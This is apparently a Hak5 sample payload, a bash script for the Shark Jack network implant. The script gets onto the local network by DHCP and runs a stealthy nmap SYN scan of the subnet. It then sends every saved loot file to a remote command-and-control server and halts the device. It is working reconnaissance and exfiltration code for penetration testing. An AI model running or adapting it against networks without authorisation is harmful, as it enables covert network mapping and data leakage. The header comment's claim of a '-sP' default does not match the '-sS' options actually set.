#!/bin/bash
#
# Title:         Sample Nmap Payload for Shark Jack
# Author:        Hak5
# Version:       1.0
#
# Scans target subnet with Nmap using specified options. Saves each scan result
# to loot storage folder.
#
# Red ...........Setup
# Amber..........Scanning
# Green..........Finished
#
# See nmap --help for options. Default "-sP" ping scans the address space for
# fast host discovery.

C2PROVISION="/etc/device.config"
NMAP_OPTIONS="-v -sS --host-timeout 30s --max-retries 3"
LOOT_DIR=/root/loot/nmap
SCAN_DIR=/etc/shark/nmap


function finish() {
    LED CLEANUP
    # Kill Nmap
    wait $1
    kill $1 &> /dev/null

    # Sync filesystem
    echo $SCAN_M > $SCAN_FILE
    sync
    sleep 1

    LED FINISH
    sleep 1

    # Halt system
    halt
}

function setup() {
    LED SETUP
    # Create loot directory
    mkdir -p $LOOT_DIR &> /dev/null

    # Create tmp scan directory
    mkdir -p $SCAN_DIR &> /dev/null

    # Create tmp scan file if it doesn't exist
    SCAN_FILE=$SCAN_DIR/scan-count
    if [ ! -f $SCAN_FILE ]; then
        touch $SCAN_FILE && echo 0 > $SCAN_FILE
    fi

    # Find IP address and subnet
    NETMODE DHCP_CLIENT
    while [ -z "$SUBNET" ]; do
        sleep 1 && find_subnet
    done
}

function find_subnet() {
    SUBNET=$(ip addr | grep -i eth0 | grep -i inet | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}[\/]{1}[0-9]{1,2}" | sed 's/\.[0-9]*\//\.0\//')
}

function run() {
    # Run setup
    setup

    SCAN_N=$(cat $SCAN_FILE)
    SCAN_M=$(( $SCAN_N + 1 ))

# Exfiltrate Loot to Cloud C2
    if [[ -f "$C2PROVISION" ]]; then
        LED SPECIAL 
# Connect to Cloud C2
        C2CONNECT
# Wait until Cloud C2 connection is established
        while ! pgrep cc-client; do sleep 1; done

        LED ATTACK
    # Start scan
        nmap $NMAP_OPTIONS $SUBNET -oN $LOOT_DIR/nmap-scan_$SCAN_M.txt &>/dev/null &
        tpid=$!
    
# Exfiltrate all test loot files
        FILES="$LOOT_DIR/*.txt"
        for f in $FILES; do C2EXFIL STRING $f Nmap-C2-Payload; done
    else
# Exit script if not provisioned for C2
        LED R SOLID
        exit 1
        fi

    sleep 10    

    finish $tpid
}


# Run payload
run &
